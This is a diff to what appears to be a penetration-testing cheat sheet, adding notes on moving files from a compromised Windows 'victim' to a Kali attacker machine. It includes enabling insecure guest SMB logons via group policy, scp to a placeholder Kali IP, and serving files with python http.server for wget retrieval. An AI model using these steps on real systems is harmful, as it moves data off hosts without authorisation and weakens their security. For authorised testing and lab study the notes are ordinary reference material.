@@ -34,6 +34,55 @@ SharpHound.exe
 * Be sure to open up the file through the file manager on Linux (GUI)
 * This makes things easier
 
+### If on Windows 11 and Impacket's SMB Server Does not Work...
+
+You will likely run into `System error 1272` occurring on the Windows machine. I could be wrong, but I believe that this is a new default security mechanism to thwart unauthenticated guest access to shared drives by default. In order to get around this, you can modify the group policy using the following instructions:
+
+```
+Open Local Group Policy Editor by typing gpedit.msc in the Run dialog (Win + R).
+
+Navigate to Computer Configuration > Administrative Templates > Network > Lanman Workstation.
+
+Find and double-click on Enable insecure guest logons.
+
+Set it to Enabled, click OK, and close the editor.
+```
+
+### SCP
+
+On the Windows side, use an SCP client like PowerShell with OpenSSH or a tool like [WinSCP](https://winscp.net/).
+
+For PowerShell, use the following command (replacing `<user>`, `<Kali_IP>`, and paths as necessary):
+
+```
+scp <path_to_local_file> <user>@<Kali_IP>:/path/on/kali
+```
+
+### Python3 HTTP Server (`http.server`)
+
+Very easy, however, it requires `python3` to be installed on the victim/host.
+
+**On Windows:**
+
+```
+# Obtain IP address of Windows machine
+ipconfig
+
+# Navigate to directory of file(s) you want to serve
+cd ...
+
+# Start server
+python3 -m http.server
+
+# By default, an HTTP server will be hosted on 127.0.0.1:8000
+```
+
+**On Kali:**
+
+```
+wget http://windows-ip:8000/file-name-here
+```
+
 ### Evil-WinRM
 
 ```
